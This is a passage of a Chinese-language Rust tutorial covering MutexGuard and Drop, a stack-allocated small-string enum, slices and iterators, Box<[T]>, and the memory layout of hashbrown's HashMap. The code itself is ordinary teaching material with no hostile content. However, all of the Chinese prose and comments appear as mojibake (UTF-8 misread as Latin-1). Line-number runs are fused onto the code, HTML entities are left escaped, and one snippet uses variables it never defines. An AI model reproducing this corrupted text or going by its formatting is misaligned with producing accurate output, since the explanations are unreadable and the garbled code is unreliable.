é¦–å…ˆï¼Œå®ƒä¼šå–å¾—é”èµ„æºï¼Œå¦‚æœæ‹¿ä¸åˆ°ï¼Œä¼šåœ¨è¿™é‡Œç­‰å¾…ï¼›å¦‚æœæ‹¿åˆ°äº†ï¼Œä¼šæŠŠ Mutex ç»“æ„çš„å¼•ç”¨ä¼ é€’ç»™ MutexGuardã€‚ 123456789101112131415161718192021222324252627282930// è¿™é‡Œç”¨ must_useï¼Œå½“ä½ å¾—åˆ°äº†å´ä¸ä½¿ç”¨ MutexGuard æ—¶ä¼šæŠ¥è­¦#[must_use = \"if unused the Mutex will immediately unlock\"]pub struct MutexGuard&lt;'a, T: ?Sized + 'a&gt; &#123; lock: &amp;'a Mutex&lt;T&gt;, poison: poison::Guard,&#125;impl&lt;T: ?Sized&gt; Deref for MutexGuard&lt;'_, T&gt; &#123; type Target = T; fn deref(&amp;self) -&gt; &amp;T &#123; unsafe &#123; &amp;*self.lock.data.get() &#125; &#125;&#125;impl&lt;T: ?Sized&gt; DerefMut for MutexGuard&lt;'_, T&gt; &#123; fn deref_mut(&amp;mut self) -&gt; &amp;mut T &#123; unsafe &#123; &amp;mut *self.lock.data.get() &#125; &#125;&#125;impl&lt;T: ?Sized&gt; Drop for MutexGuard&lt;'_, T&gt; &#123; #[inline] fn drop(&amp;mut self) &#123; unsafe &#123; self.lock.poison.done(&amp;self.poison); self.lock.inner.raw_unlock(); &#125; &#125;&#125; ä½¿ç”¨ç¤ºä¾‹ 12345678910111213141516171819202122232425262728293031323334353637use lazy_static::lazy_static;use std::borrow::Cow;use std::collections::HashMap;use std::sync::&#123;Arc, Mutex&#125;;use std::thread;use std::time::Duration;// lazy_static å®å¯ä»¥ç”Ÿæˆå¤æ‚çš„ static å¯¹è±¡lazy_static! &#123; // ä¸€èˆ¬æƒ…å†µä¸‹ Mutex å’Œ Arc ä¸€èµ·åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹æä¾›å¯¹å…±äº«å†…å­˜çš„ä½¿ç”¨ // å¦‚æœä½ æŠŠ Mutex å£°æ˜æˆ staticï¼Œå…¶ç”Ÿå‘½å‘¨æœŸæ˜¯é™æ€çš„ï¼Œä¸éœ€è¦ Arc static ref METRICS: Mutex&lt;HashMap&lt;Cow&lt;'static, str&gt;, usize&gt;&gt; = Mutex::new(HashMap::new());&#125;fn main() &#123; // ç”¨ Arc æ¥æä¾›å¹¶å‘ç¯å¢ƒä¸‹çš„å…±äº«æ‰€æœ‰æƒï¼ˆä½¿ç”¨å¼•ç”¨è®¡æ•°ï¼‰ let metrics: Arc&lt;Mutex&lt;HashMap&lt;Cow&lt;'static, str&gt;, usize&gt;&gt;&gt; = Arc::new(Mutex::new(HashMap::new())); for _ in 0..32 &#123; let m = metrics.clone(); thread::spawn(move || &#123; let mut g = m.lock().unwrap(); // æ­¤æ—¶åªæœ‰æ‹¿åˆ° MutexGuard çš„çº¿ç¨‹å¯ä»¥è®¿é—® HashMap let data = &amp;mut *g; // Cow å®ç°äº†å¾ˆå¤šæ•°æ®ç»“æ„çš„ From traitï¼Œ // æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨ \"hello\".into() ç”Ÿæˆ Cow let entry = data.entry(\"hello\".into()).or_insert(0); *entry += 1; // MutexGuard è¢« Dropï¼Œé”è¢«é‡Šæ”¾ &#125;); &#125; thread::sleep(Duration::from_millis(100)); println!(\"metrics: &#123;:?&#125;\", metrics.lock().unwrap());&#125; MutexGuard ä¸å…è®¸ Sendï¼Œåªå…è®¸ Syncï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä½ å¯ä»¥æŠŠ MutexGuard çš„å¼•ç”¨ä¼ ç»™å¦ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨ï¼Œä½†ä½ æ— æ³•æŠŠ MutexGuard æ•´ä¸ªç§»åŠ¨åˆ°å¦ä¸€ä¸ªçº¿ç¨‹ï¼š 12impl&lt;T: ?Sized&gt; !Send for MutexGuard&lt;'_, T&gt; &#123;&#125;unsafe impl&lt;T: ?Sized + Sync&gt; Sync for MutexGuard&lt;'_, T&gt; &#123;&#125; ç±»ä¼¼ MutexGuard çš„æ™ºèƒ½æŒ‡é’ˆæœ‰å¾ˆå¤šç”¨é€”ã€‚æ¯”å¦‚è¦åˆ›å»ºä¸€ä¸ªè¿æ¥æ± ï¼Œå¯ä»¥åœ¨ Drop trait ä¸­ï¼Œå›æ”¶ checkout å‡ºæ¥çš„è¿æ¥ï¼Œå°†å…¶å†æ”¾å›è¿æ¥æ± ã€‚ æ•°æ®åº“è¿æ¥æ± å®ç°ï¼šr2d2 ä¼˜åŒ– String Rust ä¸‹ String åœ¨æ ˆä¸Šå äº† 24 ä¸ªå­—èŠ‚ï¼Œç„¶ååœ¨å †ä¸Šå­˜æ”¾å­—ç¬¦ä¸²å®é™…çš„å†…å®¹ï¼Œå¯¹äºä¸€äº›æ¯”è¾ƒçŸ­çš„å­—ç¬¦ä¸²ï¼Œè¿™å¾ˆæµªè´¹å†…å­˜ã€‚ ç”¨ä¸€ä¸ª enum æ¥å¤„ç†ï¼šå½“å­—ç¬¦ä¸²å°äº N å­—èŠ‚æ—¶ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨æ ˆä¸Šçš„æ•°ç»„ï¼Œå¦åˆ™ï¼Œä½¿ç”¨ Stringã€‚ä½†æ˜¯è¿™ä¸ª N ä¸å®œå¤ªå¤§ï¼Œå¦åˆ™å½“ä½¿ç”¨ String æ—¶ï¼Œä¼šæ¯”ç›®å‰çš„ç‰ˆæœ¬æµªè´¹å†…å­˜ã€‚ å½“ä½¿ç”¨ enum æ—¶ï¼Œé¢å¤–çš„ tag + ä¸ºäº†å¯¹é½è€Œä½¿ç”¨çš„ padding ä¼šå ç”¨ä¸€äº›å†…å­˜ã€‚å› ä¸º String ç»“æ„æ˜¯ 8 å­—èŠ‚å¯¹é½çš„ï¼Œæˆ‘ä»¬çš„ enum æœ€å° 8 + 24 = 32 ä¸ªå­—èŠ‚ã€‚ è®¾è®¡ä¸€ä¸ªæ•°æ®ç»“æ„ï¼Œå†…éƒ¨ç”¨ä¸€ä¸ªå­—èŠ‚è¡¨ç¤ºå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œç”¨ 30 ä¸ªå­—èŠ‚è¡¨ç¤ºå­—ç¬¦ä¸²å†…å®¹ï¼Œå†åŠ ä¸Š 1 ä¸ªå­—èŠ‚çš„ tagï¼Œæ­£å¥½ä¹Ÿæ˜¯ 32 å­—èŠ‚ï¼Œå¯ä»¥å’Œ String æ”¾åœ¨ä¸€ä¸ª enum é‡Œä½¿ç”¨ã€‚ é€šè¿‡å®ç° Deref trait è®© MyString å¯ä»¥è¢«è§£å¼•ç”¨æˆ &amp;strã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥å®ç° Debug/Display å’Œ From traitï¼Œè®© MyString ä½¿ç”¨èµ·æ¥æ›´æ–¹ä¾¿ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103use std::&#123;fmt, ops::Deref, str&#125;;const MINI_STRING_MAX_LEN: usize = 30;// MyString é‡Œï¼ŒString æœ‰ 3 ä¸ª wordï¼Œä¾› 24 å­—èŠ‚ï¼Œæ‰€ä»¥å®ƒä»¥ 8 å­—èŠ‚å¯¹é½// æ‰€ä»¥ enum çš„ tag + padding æœ€å°‘ 8 å­—èŠ‚ï¼Œæ•´ä¸ªç»“æ„å  32 å­—èŠ‚ã€‚// MiniString å¯ä»¥æœ€å¤šæœ‰ 30 å­—èŠ‚ï¼ˆå†åŠ ä¸Š 1 å­—èŠ‚é•¿åº¦å’Œ 1å­—èŠ‚ tagï¼‰ï¼Œå°±æ˜¯ 32 å­—èŠ‚.struct MiniString &#123; len: u8, data: [u8; MINI_STRING_MAX_LEN],&#125;impl MiniString &#123; // è¿™é‡Œ new æ¥å£ä¸æš´éœ²å‡ºå»ï¼Œä¿è¯ä¼ å…¥çš„ v çš„å­—èŠ‚é•¿åº¦å°äºç­‰äº 30 fn new(v: impl AsRef&lt;str&gt;) -&gt; Self &#123; let bytes = v.as_ref().as_bytes(); // æˆ‘ä»¬åœ¨æ‹·è´å†…å®¹æ—¶ä¸€å®šè¦ä½¿ç”¨å­—ç¬¦ä¸²çš„å­—èŠ‚é•¿åº¦ let len = bytes.len(); let mut data = [0u8; MINI_STRING_MAX_LEN]; data[..len].copy_from_slice(bytes); Self &#123; len: len as u8, data, &#125; &#125;&#125;impl Deref for MiniString &#123; type Target = str; fn deref(&amp;self) -&gt; &amp;Self::Target &#123; // ç”±äºç”Ÿæˆ MiniString çš„æ¥å£æ˜¯éšè—çš„ï¼Œå®ƒåªèƒ½æ¥è‡ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ä¸‹é¢è¿™è¡Œæ˜¯å®‰å…¨çš„ str::from_utf8(&amp;self.data[..self.len as usize]).unwrap() // ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ unsafe ç‰ˆæœ¬ // unsafe &#123; str::from_utf8_unchecked(&amp;self.data[..self.len as usize]) &#125; &#125;&#125;impl fmt::Debug for MiniString &#123; fn fmt(&amp;self, f: &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result &#123; // è¿™é‡Œç”±äºå®ç°äº† Deref traitï¼Œå¯ä»¥ç›´æ¥å¾—åˆ°ä¸€ä¸ª &amp;str è¾“å‡º write!(f, \"&#123;&#125;\", self.deref()) &#125;&#125;#[derive(Debug)]enum MyString &#123; Inline(MiniString), Standard(String),&#125;// å®ç° Deref æ¥å£å¯¹ä¸¤ç§ä¸åŒçš„åœºæ™¯ç»Ÿä¸€å¾—åˆ° &amp;strimpl Deref for MyString &#123; type Target = str; fn deref(&amp;self) -&gt; &amp;Self::Target &#123; match *self &#123; MyString::Inline(ref v) =&gt; v.deref(), MyString::Standard(ref v) =&gt; v.deref(), &#125; &#125;&#125;impl From&lt;&amp;str&gt; for MyString &#123; fn from(s: &amp;str) -&gt; Self &#123; match s.len() &gt; MINI_STRING_MAX_LEN &#123; true =&gt; Self::Standard(s.to_owned()), _ =&gt; Self::Inline(MiniString::new(s)), &#125; &#125;&#125;impl fmt::Display for MyString &#123; fn fmt(&amp;self, f: &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result &#123; write!(f, \"&#123;&#125;\", self.deref()) &#125;&#125;fn main() &#123; let len1 = std::mem::size_of::&lt;MyString&gt;(); let len2 = std::mem::size_of::&lt;MiniString&gt;(); println!(\"Len: MyString &#123;&#125;, MiniString &#123;&#125;\", len1, len2); let s1: MyString = \"hello world\".into(); let s2: MyString = \"è¿™æ˜¯ä¸€ä¸ªè¶…è¿‡äº†ä¸‰åä¸ªå­—èŠ‚çš„å¾ˆé•¿å¾ˆé•¿çš„å­—ç¬¦ä¸²\".into(); // debug è¾“å‡º println!(\"s1: &#123;:?&#125;, s2: &#123;:?&#125;\", s1, s2); // display è¾“å‡º println!( \"s1: &#123;&#125;(&#123;&#125; bytes, &#123;&#125; chars), s2: &#123;&#125;(&#123;&#125; bytes, &#123;&#125; chars)\", s1, s1.len(), s1.chars().count(), s2, s2.len(), s2.chars().count() ); // MyString å¯ä»¥ä½¿ç”¨ä¸€åˆ‡ &amp;str æ¥å£ï¼Œæ„Ÿè°¢ Rust çš„è‡ªåŠ¨ Deref assert!(s1.ends_with(\"world\")); assert!(s2.starts_with(\"è¿™\"));&#125; è¿™ä¸ªç®€å•å®ç°çš„ MyStringï¼Œä¸ç®¡å®ƒå†…éƒ¨çš„æ•°æ®æ˜¯çº¯æ ˆä¸Šçš„ MiniString ç‰ˆæœ¬ï¼Œè¿˜æ˜¯åŒ…å«å †ä¸Šå†…å­˜çš„ String ç‰ˆæœ¬ï¼Œä½¿ç”¨çš„ä½“éªŒå’Œ &amp;str éƒ½ä¸€è‡´ï¼Œä»…ä»…ç‰ºç‰²äº†ä¸€ç‚¹ç‚¹æ•ˆç‡å’Œå†…å­˜ï¼Œå°±å¯ä»¥è®©å°å®¹é‡çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥é«˜æ•ˆåœ°å­˜å‚¨åœ¨æ ˆä¸Šå¹¶ä¸”è‡ªå¦‚åœ°ä½¿ç”¨ã€‚ Rust æœ‰ä¸ªå« smartstring çš„ç¬¬ä¸‰æ–¹åº“å°±å®ç°å¹¶ä¼˜åŒ–äº†è¿™ä¸ªåŠŸèƒ½ã€‚ é›†åˆå®¹å™¨ åˆ‡ç‰‡ åœ¨ Rust é‡Œï¼Œåˆ‡ç‰‡æ˜¯æè¿°ä¸€ç»„å±äºåŒä¸€ç±»å‹ã€é•¿åº¦ä¸ç¡®å®šçš„ã€åœ¨å†…å­˜ä¸­è¿ç»­å­˜æ”¾çš„æ•°æ®ç»“æ„ï¼Œç”¨ [T] æ¥è¡¨è¿°ã€‚å› ä¸ºé•¿åº¦ä¸ç¡®å®šï¼Œæ‰€ä»¥åˆ‡ç‰‡æ˜¯ä¸ª DSTï¼ˆDynamically Sized Typeï¼‰ã€‚ åˆ‡ç‰‡ä¸€èˆ¬åªå‡ºç°åœ¨æ•°æ®ç»“æ„çš„å®šä¹‰ä¸­ï¼Œä¸èƒ½ç›´æ¥è®¿é—®ï¼Œåœ¨ä½¿ç”¨ä¸­ä¸»è¦ç”¨ä»¥ä¸‹å½¢å¼ï¼š &amp;[T]ï¼šè¡¨ç¤ºä¸€ä¸ªåªè¯»çš„åˆ‡ç‰‡å¼•ç”¨ã€‚ &amp;mut [T]ï¼šè¡¨ç¤ºä¸€ä¸ªå¯å†™çš„åˆ‡ç‰‡å¼•ç”¨ã€‚ Box&lt;[T]&gt;ï¼šä¸€ä¸ªåœ¨å †ä¸Šåˆ†é…çš„åˆ‡ç‰‡ã€‚ é€šè¿‡è§£å¼•ç”¨ï¼Œæ•°æ®ç»“æ„å¯ä»¥è·å¾—åˆ‡ç‰‡çš„æ‰€æœ‰èƒ½åŠ›ï¼ŒåŒ…æ‹¬ï¼šbinary_searchã€chunksã€concatã€containsã€start_withã€end_withã€group_byã€iterã€joinã€sortã€splitã€swap ç­‰ã€‚ å½“æ„å»ºè‡ªå·±çš„æ•°æ®ç»“æ„æ—¶ï¼Œå¦‚æœå®ƒå†…éƒ¨ä¹Ÿæœ‰è¿ç»­æ’åˆ—çš„ç­‰é•¿çš„æ•°æ®ç»“æ„ï¼Œå¯ä»¥è€ƒè™‘ AsRef æˆ–è€… Deref åˆ°åˆ‡ç‰‡ã€‚ åˆ‡ç‰‡çš„å¯¹è±¡å¯ä»¥åœ¨å †ä¸Šï¼Œä¹Ÿå¯ä»¥åœ¨æ ˆä¸Šï¼Œå¹¶ä¸”å…¶å†…å®¹å¯ä»¥ç›¸äº’æ¯”è¾ƒã€‚ åˆ‡ç‰‡æ˜¯é›†åˆæ•°æ®çš„è§†å›¾ï¼Œè€Œè¿­ä»£å™¨å®šä¹‰äº†å¯¹é›†åˆæ•°æ®çš„å„ç§å„æ ·çš„è®¿é—®æ“ä½œã€‚ å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åªéœ€è¦å®šä¹‰å®ƒçš„å…³è”ç±»å‹ Item å’Œ next() æ–¹æ³•ã€‚ Item å®šä¹‰äº†æ¯æ¬¡æˆ‘ä»¬ä»è¿­ä»£å™¨ä¸­å–å‡ºçš„æ•°æ®ç±»å‹ï¼› next() æ˜¯ä»è¿­ä»£å™¨é‡Œå–ä¸‹ä¸€ä¸ªå€¼çš„æ–¹æ³•ã€‚ 123456789#[must_use = \"iterators are lazy and do nothing unless consumed\"]pub trait Iterator &#123; type Item; fn next(&amp;mut self) -&gt; Option&lt;Self::Item&gt;; // å¤§é‡ç¼ºçœçš„æ–¹æ³•ï¼ŒåŒ…æ‹¬ size_hint, count, chain, zip, map, // filter, for_each, skip, take_while, flat_map, flatten // collect, partition ç­‰ ... &#125; å¯¹ Vec ä½¿ç”¨ iter() æ–¹æ³•ï¼Œå¹¶è¿›è¡Œå„ç§ map / filter / take æ“ä½œã€‚ 1234567891011fn main() &#123; // è¿™é‡Œ Vec&lt;T&gt; åœ¨è°ƒç”¨ iter() æ—¶è¢«è§£å¼•ç”¨æˆ &amp;[T]ï¼Œæ‰€ä»¥å¯ä»¥è®¿é—® iter() let result = vec![1, 2, 3, 4] .iter() .map(|v| v * v) .filter(|v| *v &lt; 16) .take(1) .collect::&lt;Vec&lt;_&gt;&gt;(); println!(\"&#123;:?&#125;\", result);&#125; éœ€è¦æ³¨æ„çš„æ˜¯ Rust ä¸‹çš„è¿­ä»£å™¨æ˜¯ä¸ªæ‡’æ¥å£ï¼ˆlazy interfaceï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ®µä»£ç ç›´åˆ°è¿è¡Œåˆ° collect æ—¶æ‰çœŸæ­£å¼€å§‹æ‰§è¡Œï¼Œä¹‹å‰çš„éƒ¨åˆ†ä¸è¿‡æ˜¯åœ¨ä¸æ–­åœ°ç”Ÿæˆæ–°çš„ç»“æ„ï¼Œæ¥ç´¯ç§¯å¤„ç†é€»è¾‘è€Œå·²ã€‚ Rust å¤§é‡ä½¿ç”¨äº† inline ç­‰ä¼˜åŒ–æŠ€å·§ï¼Œå‡½æ•°å¼ç¼–ç¨‹ä¼˜åŒ–åï¼Œæ€§èƒ½å’Œ C è¯­è¨€çš„ for å¾ªç¯å·®åˆ«ä¸å¤§ã€‚ itertoolsï¼Œæ˜¯å’Œ Python ä¸‹ itertools åŒåä¸”åŠŸèƒ½ç±»ä¼¼çš„å·¥å…·ï¼Œæä¾›äº†å¤§é‡é¢å¤–çš„ adapterã€‚ 1234567891011use itertools::Itertools;fn main() &#123; let err_str = \"bad happened\"; let input = vec![Ok(21), Err(err_str), Ok(7)]; let it = input .into_iter() .filter_map_ok(|i| if i &gt; 10 &#123; Some(i * 2) &#125; else &#123; None &#125;); // ç»“æœåº”è¯¥æ˜¯ï¼švec![Ok(42), Err(err_str)] println!(\"&#123;:?&#125;\", it.collect::&lt;Vec&lt;_&gt;&gt;());&#125; åœ¨å®é™…å¼€å‘ä¸­ï¼Œæˆ‘ä»¬å¯èƒ½ä»ä¸€ç»„ Future ä¸­æ±‡èšå‡ºä¸€ç»„ç»“æœï¼Œé‡Œé¢æœ‰æˆåŠŸæ‰§è¡Œçš„ç»“æœï¼Œä¹Ÿæœ‰å¤±è´¥çš„é”™è¯¯ä¿¡æ¯ã€‚ç”¨ itertools é‡Œçš„ filter_map_ok()ï¼Œè¿›ä¸€æ­¥åš filter/mapã€‚ String æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ Vecï¼Œæ‰€ä»¥åœ¨ String ä¸Šåšåˆ‡ç‰‡ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ç»“æ„ &amp;strã€‚String åœ¨è§£å¼•ç”¨æ—¶ï¼Œä¼šè½¬æ¢æˆ &amp;strã€‚ Box&lt;[T]&gt; Box&lt;[T]&gt; å’Œ Vec æœ‰ä¸€ç‚¹ç‚¹å·®åˆ«ï¼šVec æœ‰é¢å¤–çš„ capacityï¼Œå¯ä»¥å¢é•¿ï¼›è€Œ Box&lt;[T]&gt; ä¸€æ—¦ç”Ÿæˆå°±å›ºå®šä¸‹æ¥ï¼Œæ²¡æœ‰ capacityï¼Œä¹Ÿæ— æ³•å¢é•¿ã€‚ Box&lt;[T]&gt;å’Œåˆ‡ç‰‡çš„å¼•ç”¨&amp;[T] ä¹Ÿå¾ˆç±»ä¼¼ï¼šå®ƒä»¬éƒ½æ˜¯åœ¨æ ˆä¸Šæœ‰ä¸€ä¸ªåŒ…å«é•¿åº¦çš„èƒ–æŒ‡é’ˆï¼ŒæŒ‡å‘å­˜å‚¨æ•°æ®çš„å†…å­˜ä½ç½®ã€‚åŒºåˆ«æ˜¯ï¼šBox&lt;[T]&gt; åªä¼šæŒ‡å‘å †ï¼Œ&amp;[T] æŒ‡å‘çš„ä½ç½®å¯ä»¥æ˜¯æ ˆä¹Ÿå¯ä»¥æ˜¯å †ï¼›æ­¤å¤–ï¼ŒBox&lt;[T]&gt; å¯¹æ•°æ®å…·æœ‰æ‰€æœ‰æƒï¼Œè€Œ &amp;[T] åªæ˜¯ä¸€ä¸ªå€Ÿç”¨ã€‚ é‚£ä¹ˆå¦‚ä½•äº§ç”Ÿ Box&lt;[T]&gt; å‘¢ï¼Ÿç›®å‰å¯ç”¨çš„æ¥å£å°±åªæœ‰ä¸€ä¸ªï¼šä»å·²æœ‰çš„ Vec ä¸­è½¬æ¢ã€‚ 1234567891011121314// ä» Vec&lt;T&gt; è½¬æ¢æˆ Box&lt;[T]&gt;ï¼Œæ­¤æ—¶ä¼šä¸¢å¼ƒå¤šä½™çš„ capacitylet b1 = v1.into_boxed_slice();// Box&lt;[T]&gt; ä¹Ÿå¯ä»¥é€šè¿‡ into_vec() è½¬æ¢å› Vec&lt;T&gt;// Box&lt;[T]&gt; å¯ä»¥æ›´æ”¹å…¶å†…éƒ¨æ•°æ®ï¼Œä½†æ— æ³• pushb2[0] = 2;// b2.push(6);// æ³¨æ„ Box&lt;[T]&gt; å’Œ Box&lt;[T; n]&gt; å¹¶ä¸ç›¸åŒlet b3 = Box::new([2, 2, 3, 4, 5]);// b2 å’Œ b3 ç›¸ç­‰ï¼Œä½† b3.deref() å’Œ v2 æ— æ³•æ¯”è¾ƒassert!(b2 == b3);// assert!(b3.deref() == v2); into_boxed_slice å’Œ into_vec ä¸¤ä¸ªè½¬æ¢éƒ½æ˜¯å¾ˆè½»é‡çš„è½¬æ¢ï¼Œåªæ˜¯å˜æ¢ä¸€ä¸‹ç»“æ„ï¼Œä¸æ¶‰åŠæ•°æ®çš„æ‹·è´ã€‚åŒºåˆ«æ˜¯ï¼Œå½“ Vec è½¬æ¢æˆ Box&lt;[T]&gt; æ—¶ï¼Œæ²¡æœ‰ä½¿ç”¨åˆ°çš„å®¹é‡å°±ä¼šè¢«ä¸¢å¼ƒï¼Œæ‰€ä»¥æ•´ä½“å ç”¨çš„å†…å­˜å¯èƒ½ä¼šé™ä½ã€‚ Box&lt;[T]&gt; æœ‰ä¸€ä¸ªå¾ˆå¥½çš„ç‰¹æ€§æ˜¯ï¼Œä¸åƒ Box&lt;[T;n]&gt; é‚£æ ·åœ¨ç¼–è¯‘æ—¶å°±è¦ç¡®å®šå¤§å°ï¼Œå®ƒå¯ä»¥åœ¨è¿è¡ŒæœŸç”Ÿæˆï¼Œä»¥åå¤§å°ä¸ä¼šå†æ”¹å˜ã€‚ æ‰€ä»¥ï¼Œéœ€è¦åœ¨å †ä¸Šåˆ›å»ºå›ºå®šå¤§å°çš„é›†åˆæ•°æ®ï¼Œä¸”ä¸å¸Œæœ›è‡ªåŠ¨å¢é•¿ï¼Œé‚£ä¹ˆï¼Œå¯ä»¥å…ˆåˆ›å»º Vecï¼Œå†è½¬æ¢æˆ Box&lt;[T]&gt;ã€‚tokio åœ¨æä¾› broadcast channel æ—¶ï¼Œå°±ä½¿ç”¨äº† Box&lt;[T]&gt; è¿™ä¸ªç‰¹æ€§ã€‚ å“ˆå¸Œè¡¨ å“ˆå¸Œå†²çªè§£å†³ï¼šé“¾åœ°å€æ³•ï¼ˆchainingï¼‰å’Œå¼€æ”¾å¯»å€æ³•ï¼ˆopen addressingï¼‰ã€‚Rust ä½¿ç”¨ å¼€æ”¾å¯»å€æ³• + äºŒæ¬¡æ¢æŸ¥ï¼ˆå¼€æ”¾å¯»å€æ³•æŠŠæ•´ä¸ªå“ˆå¸Œè¡¨çœ‹åšä¸€ä¸ªå¤§æ•°ç»„ï¼Œä¸å¼•å…¥é¢å¤–çš„å†…å­˜ï¼Œåœ¨å†²çªå‘ç”Ÿæ—¶ï¼Œä¸æ–­æ¢å¯»å“ˆå¸Œä½ç½®åŠ å‡ n çš„äºŒæ¬¡æ–¹ï¼Œæ‰¾åˆ°ç©ºé—²çš„ä½ç½®æ’å…¥ï¼‰ã€‚ é“¾åœ°å€æ³•ç¼ºç‚¹æ˜¯å“ˆå¸Œè¡¨å’Œå†²çªé“¾ä½¿ç”¨äº†ä¸åŒçš„å†…å­˜ï¼Œå¯¹ç¼“å­˜ä¸å‹å¥½ã€‚ æ ‡å‡†åº“çš„ æºä»£ç ï¼š 1234567891011use hashbrown::hash_map as base;#[derive(Clone)]pub struct RandomState &#123; k0: u64, k1: u64,&#125;pub struct HashMap&lt;K, V, S = RandomState&gt; &#123; base: base::HashMap&lt;K, V, S&gt;,&#125; HashMap æœ‰ä¸‰ä¸ªæ³›å‹å‚æ•°ï¼ŒK å’Œ V ä»£è¡¨ key / value çš„ç±»å‹ï¼ŒS æ˜¯å“ˆå¸Œç®—æ³•çš„çŠ¶æ€ï¼Œå®ƒé»˜è®¤æ˜¯ RandomStateï¼Œå ä¸¤ä¸ª u64ã€‚RandomState ä½¿ç”¨ SipHash ä½œä¸ºç¼ºçœçš„å“ˆå¸Œç®—æ³•ï¼Œä¸€ä¸ªåŠ å¯†å®‰å…¨çš„å“ˆå¸Œå‡½æ•°ï¼ˆcryptographically secure hashingï¼‰ã€‚ Rust çš„ HashMap å¤ç”¨äº† hashbrown çš„ HashMapã€‚hashbrown æ˜¯ Rust ä¸‹å¯¹ Google Swiss Table çš„ä¸€ä¸ªæ”¹è¿›ç‰ˆå®ç°ï¼š 1234pub struct HashMap&lt;K, V, S = DefaultHashBuilder, A: Allocator + Clone = Global&gt; &#123; pub(crate) hash_builder: S, pub(crate) table: RawTable&lt;(K, V), A&gt;,&#125; å¯ä»¥çœ‹åˆ°ï¼ŒHashMap é‡Œæœ‰ä¸¤ä¸ªåŸŸï¼Œä¸€ä¸ªæ˜¯ hash_builderï¼Œç±»å‹æ˜¯æ ‡å‡†åº“ä½¿ç”¨çš„ RandomStateï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯å…·ä½“çš„ RawTableï¼š 12345678910111213141516171819202122232425pub struct RawTable&lt;T, A: Allocator + Clone = Global&gt; &#123; table: RawTableInner&lt;A&gt;, // Tell dropck that we own instances of T. marker: PhantomData&lt;T&gt;,&#125;struct RawTableInner&lt;A&gt; &#123; // Mask to get an index from a hash value. The value is one less than the // number of buckets in the table. bucket_mask: usize, // [Padding], T1, T2, ..., Tlast, C1, C2, ... // ^ points here // æŒ‡å‘å“ˆå¸Œè¡¨å †å†…å­˜æœ«ç«¯çš„ ctrl åŒº ctrl: NonNull&lt;u8&gt;, // Number of elements that can be inserted before we need to grow the table growth_left: usize, // Number of elements in the table, only really used by len() items: usize, // å’Œ RawTable çš„ marker ä¸€æ ·ï¼Œåªæ˜¯ä¸€ä¸ªç”¨æ¥å ä½çš„ç±»å‹ alloc: A,&#125; HashMap å†…å­˜å¸ƒå±€ ctrl æ˜¯ä¸€ä¸ªæŒ‡å‘å“ˆå¸Œè¡¨å †åœ°å€æœ«ç«¯ ctrl åŒºçš„åœ°å€ã€‚æ¯ä¸ª bucket å¤§å°æ˜¯ keyï¼ˆcharï¼‰ + valueï¼ˆi32ï¼‰ çš„å¤§å°ï¼Œä¹Ÿå°±æ˜¯ 8 ä¸ªå­—èŠ‚ã€‚ä»¥æ­¤å¯ä»¥è®¡ç®—å‡ºå“ˆå¸Œè¡¨çš„èµ·å§‹åœ°å€ã€‚ å¯ç”¨çš„è°ƒè¯•å·¥å…·ï¼šrust-gdbï¼Œrust-lldb å†…å­˜å¸ƒå±€åˆ†ä¸ºæ ˆå’Œå †ä¸¤éƒ¨åˆ†ï¼š æ ˆï¼šRandomState(2*u64) | mask | ctrl ptr | growth_left | items å †ï¼š(ctrl ptr) æŒ‡å‘ ctrl è¡¨ | (key, value) | (key, value) ctrl è¡¨ç”¨äºå¿«é€ŸæŸ¥æ‰¾ï¼Œç”± 16 å­—èŠ‚å¤§å°çš„ control byte ç»„æˆï¼Œæ¯ä¸ª byte å¯¹åº”ä¸€ä¸ª bucketï¼Œæ¯ä¸ª bucket å¯¹åº”ä¸€ä¸ª (key, value) å¯¹ã€‚ 16 å­—èŠ‚å¤§å°çš„ control byte å¯ä»¥ç”¨ SIMD æŒ‡ä»¤å¿«é€Ÿè¯»å–åˆ°ç¼“å­˜ä¸­ã€‚ å½“ HashMap æ’å…¥å’Œåˆ é™¤æ•°æ®ï¼Œå¯¼è‡´é‡æ–°åˆ†é…çš„æ—¶å€™ï¼Œä¸»è¦å·¥ä½œå°±æ˜¯åœ¨ç»´æŠ¤ ctrl è¡¨å’Œæ•°æ®çš„å¯¹åº”ã€‚ å½“è¦åœ¨å“ˆå¸Œè¡¨ä¸­åˆ é™¤ä¸€ä¸ªå€¼æ—¶ï¼Œå…ˆè¦æ‰¾åˆ°è¦è¢«åˆ é™¤çš„ key æ‰€åœ¨çš„ä½ç½®ã€‚åœ¨æ‰¾åˆ°å…·ä½“ä½ç½®åï¼Œå¹¶ä¸éœ€è¦å®é™…æ¸…é™¤å†…å­˜ï¼Œåªéœ€è¦å°†å®ƒçš„ ctrl byte è®¾å› 0xffã€‚ å½“ key/value æœ‰é¢å¤–çš„å†…å­˜æ—¶ï¼Œæ¯”å¦‚ Stringï¼Œå®ƒçš„å†…å­˜ä¸ä¼šç«‹å³å›æ”¶ï¼Œåªæœ‰åœ¨ä¸‹ä¸€æ¬¡å¯¹åº”çš„ bucket è¢«ä½¿ç”¨æ—¶ï¼Œè®© HashMap ä¸å†æ‹¥æœ‰è¿™ä¸ª String çš„æ‰€æœ‰æƒä¹‹åï¼Œè¿™ä¸ª String çš„å†…å­˜æ‰è¢«å›æ”¶ã€‚ æ‰€ä»¥ï¼Œå¦‚æœåœ¨ HashMap ä¸­ï¼Œæ·»åŠ 